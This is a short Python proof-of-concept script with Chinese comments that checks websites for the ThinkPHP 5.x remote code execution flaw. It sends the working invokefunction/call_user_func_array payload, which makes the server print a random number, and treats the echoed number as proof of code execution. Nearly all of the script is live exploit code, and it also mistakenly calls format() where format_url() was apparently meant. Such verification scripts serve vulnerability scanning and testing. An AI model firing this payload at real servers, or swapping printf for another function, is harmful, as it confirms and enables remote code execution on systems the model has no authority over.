#coding: utf-8

"""
ThinkPHP 5.x远程命令执行漏洞验证脚本

需要requests库支持

by featherl
"""

from random import randint
from plugin.useragent import chrome
import requests


def format_url(url):
    """将url统一成 http(s)://domain/path/.../ 的格式"""
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/') + '/'

    return url

def poc(url):
    try:
        url = format(url)
        random_code = str(randint(0, 1000000)) # 生成一个随机的6位数字
        payload = '?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=' + random_code
        
        target = url + payload
        
        r = requests.get(target, headers={'User-Agent': chrome() })
        r.raise_for_status()

        r.text.index(random_code) # 若返回包中没有随机6位数字，则抛出异常
        return True
    except:
        return False
